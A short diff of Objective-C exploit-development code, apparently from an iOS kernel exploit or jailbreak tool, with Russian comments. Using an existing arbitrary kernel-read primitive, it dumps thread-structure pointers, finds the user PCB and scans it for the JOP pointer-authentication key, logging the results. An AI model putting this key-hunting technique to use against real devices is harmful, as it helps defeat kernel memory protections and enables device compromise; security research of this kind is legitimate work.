@@ -5178,6 +5178,30 @@ static void *kpParkWorker(void *arg)
             uint64_t cdata = kp_untag_ptr(kp_rc_kread64(threadVA + 0xF8));
             int tCd = kpVAType(cdata, ftbl);
             pacnote([NSString stringWithFormat:@"  machine.contextData=%#llx type=0x%x", cdata, tCd]);
+            // указатели вокруг 0xF0-0x110 глазами
+            NSMutableString *dumpM = [NSMutableString stringWithString:@"  machine ptrs:"];
+            for (uint32_t o = 0xE0; o <= 0x120; o += 8)
+                [dumpM appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(threadVA + o)];
+            pacnote(dumpM);
+            // upcb: user pcb с arm_pac_key_state_t
+            uint64_t upcb = kp_untag_ptr(kp_rc_kread64(threadVA + 0x100));
+            int tUp = kpVAType(upcb, ftbl);
+            pacnote([NSString stringWithFormat:@"  machine.upcb=%#llx type=0x%x", upcb, tUp]);
+            if (kpLooksLikeKernelPointer(upcb)) {
+                NSMutableString *ups = [NSMutableString stringWithString:@"  upcb scan:"];
+                int nu = 0;
+                uint64_t pgU = upcb & ~0x3FFFULL;
+                for (uint64_t a = pgU; a < pgU + 0x4000 && nu < 24; a += 8) {
+                    uint64_t v = kp_rc_kread64(a);
+                    if (v == jop) { [ups appendFormat:@" JOP@%+#llx", a - upcb]; nu++; }
+                }
+                if (!nu) [ups appendString:@" jop_pid тут нет"];
+                pacnote(ups);
+                NSMutableString *dumpU = [NSMutableString stringWithString:@"  upcb dump:"];
+                for (uint32_t o = 0; o < 0x100; o += 8)
+                    [dumpU appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(upcb + o)];
+                pacnote(dumpU);
+            }
             if (kpLooksLikeKernelPointer(cdata)) {
                 NSMutableString *cd = [NSMutableString stringWithString:@"  contextData scan:"];
                 int nc = 0;
